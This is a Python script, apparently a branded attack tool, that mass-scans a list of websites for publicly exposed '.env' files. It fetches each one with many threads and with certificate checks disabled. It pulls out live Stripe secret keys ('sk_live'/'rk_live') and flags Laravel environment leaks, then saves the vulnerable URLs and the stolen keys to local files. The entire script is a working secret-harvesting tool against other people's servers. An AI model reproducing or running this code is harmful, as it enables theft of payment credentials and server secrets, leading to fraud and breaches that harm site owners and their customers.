import os, random, time, threading, aiohttp, asyncio, warnings
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
M = "\033[1;96m"
R = "\033[1;31m"
G = "\033[1;32m"
R='\033[91m' 
G='\033[92m' 
Y='\033[93m' 
h ='\033[95m' 
B='\033[94m' 
L='\033[96m' 

print(G+"""

▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀
▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒ 
░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░ 
░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄ 
░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄
 ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒
 ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░
 ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░ 
   ░          ░  ░   ░     ░  ░  
 ░                                
                                         
                                         """)
                                         
print(h+"""⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯""")
envamt=0
skliveamt=0
goodip=0
total=0
dead=0
threadsamount=int(input(B+'Enter amount of threads: '))
#'Enter amount of threads: '))

#for char in threadsamount:

#    print(char, end='', 
    #


#    prin
sites=open('URLS_COMBO.txt',encoding='utf-8').read().split('\n')
random.shuffle(sites)
async def ipscan():
    global status, envamt, skliveamt, goodip, total, dead
    status = G+'                      ⌯ ⌯⌯ 𝘼𝙇𝙇⌯⌯⌯  '+R+f'{total}\n'+G+'                      ⌯⌯⌯ 𝘿𝙀𝘼𝘿 𝙄𝙋⌯⌯⌯ '+R+f'{dead}\n'+G+'                      ⌯⌯⌯ 𝙄𝙋 𝙒𝙊𝙍𝙆 ⌯⌯⌯ '+R+f'{goodip}\n '+G+'                      ⌯⌯⌯ 𝙀𝙉𝙑 𝙃𝙄𝙏𝙎⌯⌯⌯ '+R+f'{envamt}\n'+G+'                      ⌯⌯⌯ 𝙇𝙄𝙑𝙀 𝙎𝙆⌯⌯⌯ '+R+f'{skliveamt}\n '+G+'                      ⌯⌯⌯ 𝙏𝙃𝙍𝙀𝘼𝘿𝙎⌯⌯⌯ '+R+f'{threadsamount}\n'+M+'                       𝙊𝙒𝙉𝙀𝙍  @ownerb3\n'
    try:
        site=sites[0]
    except:
        quit()
    sites.pop(0)
    ip=site+'.env'
    timeout=aiohttp.ClientTimeout(total=5)
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                async with session.get(ip,timeout=timeout) as q:
                    r=await q.text()
    except:
        total+=1
        dead+=1
        
    else:
        if 'sk_live' in r or 'rk_live' in r:
            skliveamt+=1
            open('! sk-ip.txt','a').write(ip+'\n')
            sk='sk_live_'+r.split('sk_live_')[1].split('"')[0].split('\n')[0].split('#')[0].split('%')[0].split('&')[0].split(')')[0].split("'")[0].split('}')[0].split(']')[0].split(',')[0].split('.')[0].split('/')[0].split('|')[0].split('-')[0]
            open('! sks.txt','a').write(sk+'\n')
        elif 'APP_NAME' in r or 'APP_URL' in r or 'APP_HOST' in r or 'APP_KEY' in r or 'APP_DEBUG' in r or 'APP_ENV' in r:
            envamt+=1
            open('! env-ip.txt','a').write(ip+'\n')
        else:
            goodip+=1
        total+=1

def start():
    asyncio.run(ipscan())

while True:
    global status
    threadz = []
    for i in range(threadsamount):
        thread = threading.Thread(target=start)
        thread.daemon = True
        threadz.append(thread)
    for i in range(threadsamount):
        threadz[i].start()
    for i in range(threadsamount):
        threadz[i].join()
    os.system('cls || clear')
    print(status)
